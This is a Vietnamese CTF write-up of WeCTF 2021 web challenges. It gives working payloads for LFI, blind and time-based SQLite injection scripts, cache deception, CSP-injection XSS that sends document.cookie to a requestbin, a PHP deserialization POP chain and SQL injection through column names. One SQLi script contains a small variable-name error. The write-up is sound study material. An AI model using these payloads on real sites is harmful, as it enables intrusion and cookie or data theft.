---
layout: post
title: "[WRITEUP WECTF 2021]: WEB"
categories: CTF
toc: true
---

Đây là giải weCTF lần đầu mình tham gia. Cảm thấy các challenge lần này khá hay nhưng tiếc và client vuln khá nhiều nên mình hơi thọi. Dưới đây là một số writeup các challenge mình giải quyết được.

Tất cả source của các bài mình làm được mình để ở đây
https://github.com/DauHoangTai/CTF/tree/master/2021/wectf
## Challenge Include
Mới vào thì chúng ta được cung cấp source như sau và được cung cấp flag ở `/flag.txt`
```php
 <?php
show_source(__FILE__);
@include $_GET["🤯"];
```
### Solution
Vậy nhìn qua thì thấy được đó là chúng ta có thể khai thác lỗi là LFI

### Payload
`🤯=/flag.txt`

## Challenge Phish
Chúng ta được cung cấp source code nên cùng đi vào phân tích luôn
```py
 username = request.form["username"]
password = request.form["password"]
sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"

```
Đoạn code trên cho chúng ta thấy là có 2 tham số để nhập vào là `username` và `password`. Tiếp đến là được đưa vào câu query `INSERT INTO`.Điều quan trọng ở đây là 2 tham số trên được đưa thẳng vào câu query luôn và cũng như không filter gì => chúng ta có thể ez sqli ở đây. 

### Solution
Có một điều ở đây là khi chúng ta nhập giá trị cho username và password đã trùng với dữ liệu có trong DB thì sẽ báo lỗi. Nếu như không trùng với các dữ liệu đã có trong DB thì sẽ được insert vào DB và in ra `Your password is leaked...`
```py
User.create(username="shou", password=os.getenv("FLAG"))
```
Ở đoạn code này thì cho chúng ta biết được `flag` là password của `username ="shou"`
Vậy ở đây chúng ta có thể khai thác nó theo cách `time bases` hoặc `blind` bình thường cũng được.

Cách 1: Nếu như đầu tiên chúng ta tạo một chuỗi bất kì với subtr của flag, sau đó nhập lại chuỗi đó với các kí tự trong bảng mã accii thì nếu như nó báo lỗi thì đó là kí tự của flag còn ko thì ko phải. Lặp lại như vậy sẽ nó flag.

Cách 2: Sử dụng query `case when`, nếu như đúng thì trả về sleep(2), còn sai thì trả về 1. Nhưng ở challenge này sử dụng sqlite nên không có hàm sleep và thay vào đó chúng ta sử dụng hàm `upper(hex(randomblob(100000000/2)))` (PayloadsAllTheThings :v)

### Payload
Cách 1: Payload này của teammate của mình chạy ra flag sau đó đưa cho mình. Lúc đầu mình cũng viết một payload với theo cách này nhưng có vẻ do mình không sài sv Singapor nên brute được 2 char là lại bị 502 nên mình khá nản.
```py
import requests

url ="http://phish.sg.ctf.so/add"
flag=""#we{e0df7105-Xcd-4dc6-8349-f3ef83643a9@h0P3_u_didnt_u3e_sq1m4P}
padding="huhuhu"

def create_user(i,padding):
    data = {
            "username":"a",
            "password":f"taidh',(select '{padding}'||substr(password,{i},1) from User where username='shou'))-- -"
            }
    r= requests.post(url,data=data,)
    print(r.text)
def brute(j,padding):
    data = {
            "username":padding+chr(j),
            "password":"a"
            }
    r= requests.post(url,data=data)
    return r
for i in range(1,70):
    print(padding)
    create_user(i,padding)
    for j in range(32,128):
        #print(chr(j))
        if chr(j)!="'":
            r=brute(j,padding)
            #print(r.text)
            if "UNIQUE constraint" in r.text:
                flag+=chr(j)
                padding+=chr(j)
                print(flag)
                break
```
Cách 2: Sử dụng `case when`
```py
import requests
import string

list_char = string.ascii_letters + string.digits + '{_-}@'
flag = '' #wectf{f7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}
url = 'http://phish.sg.ctf.so/add'

for i in range(1,100):
    for char in list_char:
        temp = flag + char
        print(temp,end='\r')
        data = {'username': "'||hex(randomblob(10))||'",'password': f"'||(case ((select substr(password,1,{i}) from user where username='shou')='{temp}') when 1 then upper(hex(randomblob(100000000/2))) else 1 end)||'"}
        r = requests.post(url=url, data=data)
        if res.elapsed.total_seconds() > 1:
            flag += char
            print(flag)
            break
    else:
        break
```

## Challenge Cache
Chúng ta có 2 enpoint lầ `flag` và `index`. Khi truy cập `/index` thì web show ra là `Not thing here, check out /flag.`. Truy cập `/flag` thì web show cho chúng ta `Only admin can view this!`.

Ở trong file `cache/cache_miđleware.py` 
```py
CACHE = {}  # PATH => (Response, EXPIRE)


class SimpleMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request: HttpRequest):
        path = urllib.parse.urlparse(request.path).path
        if path in CACHE and CACHE[path][1] > time.time():
            return CACHE[path][0]
        is_static = path.endswith(".css") or path.endswith(".js") or path.endswith(".html")
        response = self.get_response(request)
        if is_static:
            CACHE[path] = (response, time.time() + 10)
        return response

```
chúng ta thấy được chương trình sẽ lưu nội dung vào bộ nhớ cache nếu như đường dẫn có kết thúc là `.css`, `.js` hoặc `.html` và nó sẽ lưu trong 10s, hết 10s nó sẽ lưu cái mới.
=> Vậy chúng ta chỉ cần gửi `/flag.html` cho bot và sau đó reset lại trang thì sẽ có flag

### Payload
Gửi cho bot `http://cache.sf.ctf.so/flag.html`. Tiếp theo truy cập lại trang đó sẽ có flag

## Challenge CSP 1
Vô thẳng việc phân tích code: Chúng ta có thể nhập một nội dung bất kì sau đó chương trình sẽ in ra nội dung đó cho mình.
```py
def display(token):
    user_obj = Post.select().where(Post.token == token)
    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
    img_urls = [x['src'] for x in bs(content).find_all("img")]
    tmpl = render_template("display.html", content=content)
    resp = make_response(tmpl)
    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
    return resp
```
Ở đoạn code display trên trong file `app.py` được cung cấp thì chúng ta thấy được có `Content-Security-Policy` nhưng chú ý thì thấy có một biến được truyền thẳng vô nội dung của header là `img_urls`.

### Solution
Vậy chúng ta cùng xem biến `img_urls` được khởi tạo như nào.
```py
 img_urls = [x['src'] for x in bs(content).find_all("img")]
```
Đoạn code này là khởi tạo biến `img_urls` => nó nhận value nằm trong src="" của thẻ `img` => chúng ta có thể dựa vô đây để ghi đè header và từ đó có thể thực thi thẻ script mà các header của `Content-Security-Policy` đã chặn.

### Payload
```
content = <img src ="http://a;script-src 'unsafe-inline';"<script>alert(1)</script>
```
Như vậy chúng ta có thể trigger được xss. Ở đây mình sài `script-src` chứ không phải `script-src-elem` vì bot chạy trên firefox nên payload `script-src-elem` không hoạt động (có thể trigger được xss nhưng không lấy được flag)
Đây là payload lấy cookie
```
content = <img src ="http://a;script-src 'unsafe-inline';"<script>location.replace="requestbin"%2bbtoa(document.cookie)</script>
```
Sau đó gửi link bài viết cho bot, cuối cùng vô requestbin để chờ flag

## Challenge CSP 2 và 3
Ở challenge CSP 2 và 3 này thì cũng chúng ta cũng nhập vào và sau đó chương trình sẽ in ra cho mình cái nội dung mình đã gửi đó.
Chú ý file `CSP.module` thì ở đây có `Content-Security-Policy`.

```php
header("Content-Security-Policy: default-src 'none'; script-src $nonce; img-src 'self'; style-src $nonce; base-uri 'self'; report-uri $this->report_uri_string;");
```
Ở đoạn code này thấy được có một biến lại được truyền thẳng vô header là `$this->report_uri_string`. Vậy để xem biến này nó nằm ở đâu và chúng ta có thể control nó không.
Cùng file `CSP.module`

```php
class CSP extends Typed
{
    public $report_uri_string;

    protected function construct()
    {
        $this->report_uri_string = '/report_csp';
    }
...
```
Vậy `$this->report_uri_string` được khởi tạo đi gọi chương trình gọi class `CSP` và biến `$this->report_uri_string` được gán mặc định là `/report_csp` => Ở đây chúng ta chưa thể control biến này và injection vào header như challenge CSP 1.

Nhưng khi chú ý vào file `index.php` thì thấy được có một tham số khi chúng ta nhập vào nó sẽ `unserialize` đó là `user` => Chúng ta có thể dựa vô đây để có thể control biến `report_uri_string` và injection bất kì.

### Solution
Tạo POP chain từ mấy class trên để control biến `report_uri_string` thành `/a;script-src-elem 'unsafe-inline'` => ghi đè các header trước đó và chúng ta có thể sử dụng tag `script` bình thường.

### Payload
Dưới đây là payload của challenge `CSP 2`
```php
<?php
namespace ShouFramework {
    abstract class Typed {
        abstract protected function construct();
        abstract protected function destruct();

        private function type_checker() {}

        public function __construct() {
            $this->construct();
        }

        public function __destruct() {
            $this->destruct();
        }

        public function __wakeup() {
            $this->type_checker();
        }
    }

    class Template extends Typed {
        protected function construct() {}

        protected function destruct() {}
    }

    abstract class HTTP extends Typed {
        public Template $template_object;

        protected function construct() {
            $this->template_object = new Template();
        }

        public function handle() {}

        public function handle_request() {
            $this->handle();
            $this->render();
        }

        abstract public function render();

        protected function destruct() {
            $this->handle_request();
        }
    }

    class CSP extends Typed {
        public $report_uri_string = "/a; script-src-elem 'unsafe-inline'";

        protected function construct() {}

        protected function destruct() {}
    }
}

namespace {
    class UserData extends \ShouFramework\Typed {
        public $token_string = 'test';

        protected function construct() {}

        protected function destruct() {}
    }

    class CatWithHashGet extends \ShouFramework\HTTP {
        public UserData $user_object;
        public \ShouFramework\CSP $csp_object;

        public function construct() {
            parent::construct();
            $this->user_object = new UserData();
            $this->csp_object = new \ShouFramework\CSP();
        }

        public function render() {}
    }

    echo urlencode(serialize([new CatWithHashGet])) . PHP_EOL;
}
?>
```
Payload challenge CSP 3 thì chúng ta chỉ cần thay đổi `$report_uri_string` thành `\r\n` để thì header CSP sẽ không được thêm vào.

## Challenge CloudTable
Chúng ta thử nhập vô `Attribute Name` với một giá trị bất kì thì sau đó chương trình sẽ load ra cho mình 1 json gồm các thông tin như `host, DB, username, password, tablename`. Vậy chúng ta chúng ta truy cập vào thử thì thấy được value mà chúng ta nhập ở trên là tên của một column

### Solution

```py
create_sql_tmpl = f"CREATE TABLE `{BASE_DB}`.`{table_name}`("
        for i in info_arr:
            create_sql_tmpl += f"`%s` {SCHEMA_TYPES[int(schema[i])]},"
        create_sql_tmpl = create_sql_tmpl[:-1] + ");"
```
Ở đoạn code ta thấy được họ sài \` vậy mình sử dụng nó để escape đoạn tạo column chính là giá trị tại tham số `Attribute Name`. 

Thử nhập vô
```
taidh` INT,taidh1 INT)-- -
```
Sau khi connect thì thấy được có thêm một column taidh1 được tạo => sure có thể injection vào đây

### Payload
```sql
`taidh INT) select * from CloudTable.flag;-- -
```
Vì ở description challenge tác giả đã cho biết là flag nằm ở tablename là flag nên ta dump luôn flag. Cuối cùng connect vô sever sql được tạo đó và select * from table_name mà chương trình radom ra cho mình đã hiện ra ở trên.
=> Có flag :)

## Tài liệu tham khảo
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- https://portswigger.net/research/bypassing-csp-with-policy-injection

Các bạn cũng có thể truy cập link dưới đây là toàn bộ writeup của tác giả và có tất cả source của giải weCTF
- https://github.com/wectf/2021

